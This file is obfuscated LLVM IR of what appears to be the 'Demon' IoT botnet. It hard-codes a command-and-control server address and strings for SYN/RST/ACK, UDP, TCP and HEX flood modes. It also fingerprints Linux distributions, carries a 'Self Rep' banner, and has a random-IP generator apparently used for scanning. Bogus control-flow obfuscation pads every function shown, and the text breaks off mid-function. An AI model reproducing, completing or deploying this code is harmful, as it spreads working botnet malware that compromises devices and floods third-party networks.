; ModuleID = 'host/ir_bcf/Demon.e.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.ifreq = type { %union.anon, %union.anon.0 }
%union.anon = type { [16 x i8] }
%union.anon.0 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.2 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@Demonserv = global [1 x i8*] [i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [19 x i8] c"165.227.34.187:666\00", align 1
@Demonicsock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@pids = common global i32* null, align 8
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.1 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.2 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.36 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.6 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.7 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.8 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@astd.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.11, i32 0, i32 0)], align 8
@.str.11 = private unnamed_addr constant [78 x i8] c"Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS\0A\00", align 1
@.str.12 = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"Linux\00", align 1
@.str.14 = private unnamed_addr constant [17 x i8] c"/usr/bin/apt-get\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"Ubuntu\00", align 1
@.str.16 = private unnamed_addr constant [17 x i8] c"/usr/lib/portage\00", align 1
@.str.17 = private unnamed_addr constant [7 x i8] c"Gentoo\00", align 1
@.str.18 = private unnamed_addr constant [13 x i8] c"/usr/bin/yum\00", align 1
@.str.19 = private unnamed_addr constant [7 x i8] c"CentOS\00", align 1
@.str.20 = private unnamed_addr constant [17 x i8] c"/usr/share/YaST2\00", align 1
@.str.21 = private unnamed_addr constant [9 x i8] c"OpenSUSE\00", align 1
@.str.22 = private unnamed_addr constant [19 x i8] c"/usr/local/etc/pkg\00", align 1
@.str.23 = private unnamed_addr constant [8 x i8] c"FreeBSD\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"/etc/dropbear/\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"Dropbear\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"/etc/opkg\00", align 1
@.str.27 = private unnamed_addr constant [8 x i8] c"OpenWRT\00", align 1
@.str.28 = private unnamed_addr constant [15 x i8] c"Unknown Distro\00", align 1
@.str.29 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.30 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.31 = private unnamed_addr constant [4 x i8] c"HEX\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.34 = private unnamed_addr constant [180 x i8] c"\1B[1;31mDemon\1B[1;37m[\1B[1;31mV5.0\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\1B[1;31m-->\1B[1;37m[\1B[0;36m%s\1B[1;37m]\00", align 1
@.str.35 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = load i32, i32* @x
  %3 = load i32, i32* @y
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* %10, align 4
  store i32 %12, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %13 = load i32, i32* %10, align 4
  %14 = add i32 %13, -1640531527
  store i32 %14, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %15 = load i32, i32* %10, align 4
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %11, align 4
  %18 = load i32, i32* @x
  %19 = load i32, i32* @y
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %63, %originalBBpart2
  %27 = load i32, i32* %11, align 4
  %28 = icmp slt i32 %27, 4096
  br i1 %28, label %29, label %66

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* @x
  %31 = load i32, i32* @y
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %29
  %38 = load i32, i32* %11, align 4
  %39 = sub nsw i32 %38, 3
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %40
  %42 = load i32, i32* %41, align 4
  %43 = load i32, i32* %11, align 4
  %44 = sub nsw i32 %43, 2
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  %47 = load i32, i32* %46, align 4
  %48 = xor i32 %42, %47
  %49 = xor i32 %48, -1640531527
  %50 = load i32, i32* %11, align 4
  %51 = xor i32 %49, %50
  %52 = load i32, i32* %11, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %53
  store i32 %51, i32* %54, align 4
  %55 = load i32, i32* @x
  %56 = load i32, i32* @y
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart266, label %originalBB15alteredBB

originalBBpart266:                                ; preds = %originalBB15
  br label %63

; <label>:63:                                     ; preds = %originalBBpart266
  %64 = load i32, i32* %11, align 4
  %65 = add nsw i32 %64, 1
  store i32 %65, i32* %11, align 4
  br label %26

; <label>:66:                                     ; preds = %26
  %67 = load i32, i32* @x
  %68 = load i32, i32* @y
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %66
  %75 = load i32, i32* @x
  %76 = load i32, i32* @y
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %83 = alloca i32, align 4
  %84 = alloca i32, align 4
  store i32 %0, i32* %83, align 4
  %85 = load i32, i32* %83, align 4
  store i32 %85, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %86 = load i32, i32* %83, align 4
  %_ = shl i32 %86, -1640531527
  %_1 = shl i32 %86, -1640531527
  %_2 = shl i32 %86, -1640531527
  %87 = add i32 %86, -1640531527
  store i32 %87, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %88 = load i32, i32* %83, align 4
  %_3 = sub i32 %88, -1640531527
  %gen = mul i32 %_3, -1640531527
  %_4 = shl i32 %88, -1640531527
  %89 = add i32 %88, -1640531527
  %_5 = sub i32 %89, -1640531527
  %gen6 = mul i32 %_5, -1640531527
  %_7 = shl i32 %89, -1640531527
  %_8 = shl i32 %89, -1640531527
  %_9 = shl i32 %89, -1640531527
  %_10 = shl i32 %89, -1640531527
  %_11 = sub i32 0, %89
  %gen12 = add i32 %_11, -1640531527
  %_13 = sub i32 0, %89
  %gen14 = add i32 %_13, -1640531527
  %90 = add i32 %89, -1640531527
  store i32 %90, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %84, align 4
  br label %originalBB

originalBB15alteredBB:                            ; preds = %originalBB15, %29
  %91 = load i32, i32* %11, align 4
  %_16 = sub i32 0, %91
  %gen17 = add i32 %_16, 3
  %_18 = sub i32 %91, 3
  %gen19 = mul i32 %_18, 3
  %_20 = sub i32 0, %91
  %gen21 = add i32 %_20, 3
  %_22 = shl i32 %91, 3
  %_23 = sub i32 %91, 3
  %gen24 = mul i32 %_23, 3
  %_25 = sub i32 %91, 3
  %gen26 = mul i32 %_25, 3
  %_27 = shl i32 %91, 3
  %92 = sub nsw i32 %91, 3
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %93
  %95 = load i32, i32* %94, align 4
  %96 = load i32, i32* %11, align 4
  %_28 = sub i32 0, %96
  %gen29 = add i32 %_28, 2
  %_30 = sub i32 %96, 2
  %gen31 = mul i32 %_30, 2
  %_32 = shl i32 %96, 2
  %_33 = sub i32 0, %96
  %gen34 = add i32 %_33, 2
  %_35 = sub i32 0, %96
  %gen36 = add i32 %_35, 2
  %_37 = sub i32 %96, 2
  %gen38 = mul i32 %_37, 2
  %97 = sub nsw i32 %96, 2
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %98
  %100 = load i32, i32* %99, align 4
  %_39 = sub i32 %95, %100
  %gen40 = mul i32 %_39, %100
  %_41 = sub i32 0, %95
  %gen42 = add i32 %_41, %100
  %_43 = sub i32 0, %95
  %gen44 = add i32 %_43, %100
  %_45 = shl i32 %95, %100
  %_46 = sub i32 0, %95
  %gen47 = add i32 %_46, %100
  %_48 = sub i32 %95, %100
  %gen49 = mul i32 %_48, %100
  %_50 = sub i32 0, %95
  %gen51 = add i32 %_50, %100
  %_52 = sub i32 0, %95
  %gen53 = add i32 %_52, %100
  %_54 = sub i32 0, %95
  %gen55 = add i32 %_54, %100
  %101 = xor i32 %95, %100
  %_56 = shl i32 %101, -1640531527
  %_57 = sub i32 0, %101
  %gen58 = add i32 %_57, -1640531527
  %_59 = sub i32 0, %101
  %gen60 = add i32 %_59, -1640531527
  %_61 = sub i32 %101, -1640531527
  %gen62 = mul i32 %_61, -1640531527
  %102 = xor i32 %101, -1640531527
  %103 = load i32, i32* %11, align 4
  %_63 = sub i32 %102, %103
  %gen64 = mul i32 %_63, %103
  %104 = xor i32 %102, %103
  %105 = load i32, i32* %11, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %106
  store i32 %104, i32* %107, align 4
  br label %originalBB15

originalBB68alteredBB:                            ; preds = %originalBB68, %66
  br label %originalBB68
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.1
  %38 = load i32, i32* @y.2
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %50

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* %11, align 4
  %47 = add i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @c, align 4
  %49 = add i32 %48, 1
  store i32 %49, i32* @c, align 4
  br label %50

; <label>:50:                                     ; preds = %45, %originalBBpart2
  %51 = load i32, i32* @x.1
  %52 = load i32, i32* @y.2
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %50
  %59 = load i32, i32* %12, align 4
  %60 = load i32, i32* %11, align 4
  %61 = sub i32 %59, %60
  %62 = load i32, i32* @rand_cmwc.i, align 4
  %63 = zext i32 %62 to i64
  %64 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %63
  store i32 %61, i32* %64, align 4
  %65 = load i32, i32* @x.1
  %66 = load i32, i32* @y.2
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart235, label %originalBB32alteredBB

originalBBpart235:                                ; preds = %originalBB32
  ret i32 %61

originalBBalteredBB:                              ; preds = %originalBB, %0
  %73 = alloca i64, align 8
  %74 = alloca i64, align 8
  %75 = alloca i32, align 4
  %76 = alloca i32, align 4
  store i64 18782, i64* %74, align 8
  store i32 -2, i32* %76, align 4
  %77 = load i32, i32* @rand_cmwc.i, align 4
  %_ = sub i32 0, %77
  %gen = add i32 %_, 1
  %_1 = shl i32 %77, 1
  %78 = add i32 %77, 1
  %_2 = sub i32 0, %78
  %gen3 = add i32 %_2, 4095
  %79 = and i32 %78, 4095
  store i32 %79, i32* @rand_cmwc.i, align 4
  %80 = load i64, i64* %74, align 8
  %81 = load i32, i32* @rand_cmwc.i, align 4
  %82 = zext i32 %81 to i64
  %83 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %82
  %84 = load i32, i32* %83, align 4
  %85 = zext i32 %84 to i64
  %_4 = sub i64 %80, %85
  %gen5 = mul i64 %_4, %85
  %_6 = sub i64 0, %80
  %gen7 = add i64 %_6, %85
  %_8 = shl i64 %80, %85
  %_9 = shl i64 %80, %85
  %_10 = shl i64 %80, %85
  %_11 = shl i64 %80, %85
  %86 = mul i64 %80, %85
  %87 = load i32, i32* @c, align 4
  %88 = zext i32 %87 to i64
  %_12 = sub i64 %86, %88
  %gen13 = mul i64 %_12, %88
  %_14 = shl i64 %86, %88
  %_15 = shl i64 %86, %88
  %_16 = sub i64 0, %86
  %gen17 = add i64 %_16, %88
  %_18 = sub i64 0, %86
  %gen19 = add i64 %_18, %88
  %_20 = sub i64 %86, %88
  %gen21 = mul i64 %_20, %88
  %_22 = sub i64 0, %86
  %gen23 = add i64 %_22, %88
  %89 = add i64 %86, %88
  store i64 %89, i64* %73, align 8
  %90 = load i64, i64* %73, align 8
  %_24 = shl i64 %90, 32
  %_25 = shl i64 %90, 32
  %91 = lshr i64 %90, 32
  %92 = trunc i64 %91 to i32
  store i32 %92, i32* @c, align 4
  %93 = load i64, i64* %73, align 8
  %94 = load i32, i32* @c, align 4
  %95 = zext i32 %94 to i64
  %_26 = shl i64 %93, %95
  %_27 = sub i64 0, %93
  %gen28 = add i64 %_27, %95
  %_29 = sub i64 0, %93
  %gen30 = add i64 %_29, %95
  %_31 = shl i64 %93, %95
  %96 = add i64 %93, %95
  %97 = trunc i64 %96 to i32
  store i32 %97, i32* %75, align 4
  %98 = load i32, i32* %75, align 4
  %99 = load i32, i32* @c, align 4
  %100 = icmp ult i32 %98, %99
  br label %originalBB

originalBB32alteredBB:                            ; preds = %originalBB32, %50
  %101 = load i32, i32* %12, align 4
  %102 = load i32, i32* %11, align 4
  %_33 = shl i32 %101, %102
  %103 = sub i32 %101, %102
  %104 = load i32, i32* @rand_cmwc.i, align 4
  %105 = zext i32 %104 to i64
  %106 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %105
  store i32 %103, i32* %106, align 4
  br label %originalBB32
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = load i32, i32* @x.3
  %3 = load i32, i32* @y.4
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %13 = call i32 @ntohl(i32 %12) #9
  %14 = load i32, i32* %10, align 4
  %15 = and i32 %13, %14
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* %11, align 4
  %17 = call i32 @rand_cmwc()
  %18 = load i32, i32* %10, align 4
  %19 = xor i32 %18, -1
  %20 = and i32 %17, %19
  %21 = xor i32 %16, %20
  %22 = load i32, i32* @x.3
  %23 = load i32, i32* @y.4
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %21

originalBBalteredBB:                              ; preds = %originalBB, %1
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  store i32 %0, i32* %30, align 4
  %32 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %33 = call i32 @ntohl(i32 %32) #9
  %34 = load i32, i32* %30, align 4
  %_ = shl i32 %33, %34
  %_1 = sub i32 %33, %34
  %gen = mul i32 %_1, %34
  %_2 = shl i32 %33, %34
  %_3 = sub i32 %33, %34
  %gen4 = mul i32 %_3, %34
  %_5 = sub i32 %33, %34
  %gen6 = mul i32 %_5, %34
  %_7 = sub i32 0, %33
  %gen8 = add i32 %_7, %34
  %35 = and i32 %33, %34
  store i32 %35, i32* %31, align 4
  %36 = load i32, i32* %31, align 4
  %37 = call i32 @rand_cmwc()
  %38 = load i32, i32* %30, align 4
  %_9 = sub i32 %38, -1
  %gen10 = mul i32 %_9, -1
  %_11 = shl i32 %38, -1
  %_12 = sub i32 %38, -1
  %gen13 = mul i32 %_12, -1
  %39 = xor i32 %38, -1
  %_14 = sub i32 %37, %39
  %gen15 = mul i32 %_14, %39
  %_16 = sub i32 %37, %39
  %gen17 = mul i32 %_16, %39
  %_18 = sub i32 0, %37
  %gen19 = add i32 %_18, %39
  %_20 = sub i32 0, %37
  %gen21 = add i32 %_20, %39
  %_22 = sub i32 %37, %39
  %gen23 = mul i32 %_22, %39
  %_24 = shl i32 %37, %39
  %40 = and i32 %37, %39
  %_25 = shl i32 %36, %40
  %_26 = sub i32 %36, %40
  %gen27 = mul i32 %_26, %40
  %_28 = shl i32 %36, %40
  %_29 = sub i32 %36, %40
  %gen30 = mul i32 %_29, %40
  %_31 = sub i32 %36, %40
  %gen32 = mul i32 %_31, %40
  %41 = xor i32 %36, %40
  br label %originalBB
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %3
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* %8, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

; <label>:16:                                     ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %8, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

; <label>:25:                                     ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  %27 = load i32, i32* @x.5
  %28 = load i32, i32* @y.6
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %25
  %35 = load i32, i32* @x.5
  %36 = load i32, i32* @y.6
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %43, label %53

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* %6, align 4
  %45 = load i8*, i8** %4, align 8
  %46 = load i32, i32* %8, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = call i64 @read(i32 %44, i8* %48, i64 1)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %7, align 4
  %51 = load i32, i32* %8, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %8, align 4
  br label %9

; <label>:53:                                     ; preds = %originalBBpart2
  %54 = load i32, i32* @x.5
  %55 = load i32, i32* @y.6
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = load i32, i32* %7, align 4
  %63 = icmp eq i32 %62, 0
  %64 = load i32, i32* @x.5
  %65 = load i32, i32* @y.6
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %63, label %72, label %73

; <label>:72:                                     ; preds = %originalBBpart24
  br label %91

; <label>:73:                                     ; preds = %originalBBpart24
  %74 = load i32, i32* @x.5
  %75 = load i32, i32* @y.6
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i8*, i8** %4, align 8
  %83 = load i32, i32* @x.5
  %84 = load i32, i32* @y.6
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %91

; <label>:91:                                     ; preds = %originalBBpart28, %72
  %92 = phi i8* [ null, %72 ], [ %82, %originalBBpart28 ]
  %93 = load i32, i32* @x.5
  %94 = load i32, i32* @y.6
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %91
  %101 = load i32, i32* @x.5
  %102 = load i32, i32* @y.6
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
